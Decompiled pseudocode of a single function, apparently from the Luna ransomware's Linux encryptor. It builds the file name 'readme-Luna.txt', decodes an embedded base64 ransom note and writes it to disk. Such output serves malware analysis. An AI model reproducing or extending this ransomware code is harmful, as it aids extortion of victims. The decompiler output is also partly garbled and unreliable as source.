fn linux_encryptor::files::create_note() -> u32 {
    let v0: i64;  // [sp-0x10e8], Other Possible Types: struct16, int
    let v1: i64;  // [sp-0x10e0]
    let v2: i64;  // [sp-0x10d8]
    let v3: i64;  // [sp-0x10b0]
    let v4: iNone;  // [bp-0x10a8], Other Possible Types: struct8
    let v5: i64;  // [sp-0x1098]
    let v6: iNone;  // [sp-0x1088], Other Possible Types: Result<struct16, struct10>
    let v7: i64;  // [sp-0x1078]
    let v8: i64;  // [sp-0x1070]
    let v9: i64;  // [sp-0x1068]
    let v10: i64;  // [sp-0x1060]
    let v11: i64;  // [sp-0x1058], Other Possible Types: struct16, struct48, struct24, Result<struct16, struct10>
    let v12: i64;  // [sp-0x1050]
    let v13: i64;  // [bp-0x1048]
    let v14: i8;  // [bp-0x1028]
    let v15: i16;  // [bp-0x28]
    let v17: i64;  // rdi
    let v18: i64;  // rsi
    let v19: i64;  // rax
    let v20: i64;  // r14
    let v21: i64;  // rbx
    let v22: i64;  // rbx
    let v23: i64;  // rcx
    let v24: i64;  // rdx
    let v25: i64;  // rdx
    let v26: i64;  // rsi
    let v28: i64;  // rdx
    let v29: i32;  // esi
    let v30: i32;  // ebx
    let v31: i32;  // edi
    let v32: i64;  // rbx
    let v33: i64;  // rcx
    let v34: i64;  // rdx
    let v35: i64;  // rdx
    let v36: i64;  // rsi
    let v38: i64;  // rax
    let v39: i32;  // edx
    let v40: i32;  // edi
    let v41: i32;  // esi
    let v42: i64;  // rax

    v11 = <alloc::string::String as core::clone::Clone>::clone(v17);
    v18 = v11.field_16;
    if v12 - v18 <= 6 {
        v11 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v18, 7);
        v18 = v11.field_16;
    }
    v19 = v11;
    *((v19 + v18 + 3) as &i32) = 761621860;
    *((v19 + v18) as &i32) = 1684104562;
    v0 = v11;
    v11 = core::str::converts::from_utf8("Luna");
    if v11 {
        *(&v4 as &i128) = *((&v11 as &char + 8) as &i128);
        core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v4, &g_473eb0, "src/files.rs"); /* do not return */
    }
    v20 = *((&v11 as &char + 16) as &i64);
    v21 = v2;
    if v1 - v21 < v20 {
        v0 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v21, v20);
        v21 = v2;
    }
    memcpy(v0 + v21, v12, v20);
    v22 = v21 + v20;
    v13 = v22;
    v11 = v0;
    if v12 - v22 <= 3 {
        v11 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v22, 4);
        v22 = v13;
    }
    *((v11 + v22) as &i32) = 1954051118;
    v6 = v11;
    v23 = &g_453357;
    v24 = 746;
    do {
        v25 = v24;
        if v23 == 4535874 {
            core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
        }
        v26 = *(v23 as &i8);
        if v26 as u8 >= 0 {
            v23 += 1;
        } else if (v26 & 255) < 224 {
            v23 += 2;
        } else if (v26 & 255) < 240 {
            v23 += 3;
        } else if (*((v23 + 3) as &i8) & 63 | (*((v23 + 2) as &i8) & 63) * 64 | (*((v23 + 1) as &i8) & 63) * 0x1000 | (v26 as u32 & 7) * 0x40000) != 0x110000 {
            v23 += 4;
        } else {
            core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
        }
        v24 = v25 - 1;
    } while (v25 != 1);
    if v23 == 4535874 {
        core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
    }
    v28 = *(v23 as &i8);
    if v28 as u8 >= 0 {
LABEL_40b975:
        v32 = 559;
        if !(v28 as u32 == 61) {
            goto LABEL_40babe;
        }
    } else {
        v29 = v28 as u32 & 31;
        v30 = *((v23 + 1) as &i8) & 63;
        if (v28 & 255) <= 223 {
            v32 = 559;
            if !((v29 as u64 * 64 | v30) == 61) {
                goto LABEL_40babe;
            }
        } else {
            v31 = *((v23 + 2) as &i8) & 63 | v30 as u64 * 64;
            if (v28 & 255) < 240 {
                v32 = 559;
                if !((v31 | v29 as u64 * 0x1000) == 61) {
                    goto LABEL_40babe;
                }
            } else {
                v28 = *((v23 + 3) as &i8) & 63 | v31 as u64 * 64 | (v29 & 7) as u64 * 0x40000;
                if v28 as u32 == 0x110000 {
                    core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
                }
                goto LABEL_40b975;
            }
        }
    }
    v33 = &g_453357;
    v34 = 745;
    do {
        v35 = v34;
        if v33 == 4535874 {
            core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
        }
        v36 = *(v33 as &i8);
        if v36 as u8 >= 0 {
            v33 += 1;
        } else if (v36 & 255) < 224 {
            v33 += 2;
        } else if (v36 & 255) < 240 {
            v33 += 3;
        } else {
            if (*((v33 + 3) as &i8) & 63 | (*((v33 + 2) as &i8) & 63) * 64 | (*((v33 + 1) as &i8) & 63) * 0x1000 | (v36 as u32 & 7) * 0x40000) == 0x110000 {
                core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
            }
            v33 += 4;
        }
        v34 = v35 - 1;
    } while (v35 != 1);
    if v33 == 4535874 {
        core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
    }
    v38 = *(v33 as &i8);
    if v38 as u8 < 0 {
        v39 = v38 as u32 & 31;
        v40 = *((v33 + 1) as &i8) & 63;
        if (v38 & 255) <= 223 {
            v38 = (v39 as u64 * 64 | v40) as u64;
        } else {
            v41 = *((v33 + 2) as &i8) & 63 | v40 as u64 * 64;
            if (v38 & 255) < 240 {
                v38 = v41 | v39 as u64 * 0x1000;
            } else {
                v38 = *((v33 + 3) as &i8) & 63 | v41 as u64 * 64 | (v39 & 7) as u64 * 0x40000;
                if v38 as u32 == 0x110000 {
                    core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
                }
            }
        }
    }
    v32 = 558 - (v38 as u32 == 61);
LABEL_40babe:
    v42 = __rust_alloc_zeroed(v32, 1);
    v8 = v42;
    v9 = v32;
    v10 = v32;
    memset(&v14, 0, 0x1000);
    v11 = struct48 {
        field_0: &g_453357
        field_8: 747
        field_16: 0
        field_32: 0
    };
    *(&v15 as &i16) = 0;
    v0 = <base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read(&v11, v42);
    if v0 {
        v4 = struct8 {
            field_0: v0.field_8
        };
        core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v4, &g_473e70, "src/files.rs"); /* do not return */
    }
    v5 = v7;
    v4 = v6;
    v2 = v10;
    *(&v0 as &i128) = *(&v8 as &i128);
    v3 = std::fs::write(&v4, &v0);
    if !v3 {
        return;
    }
    println!("Error while writing note");
}
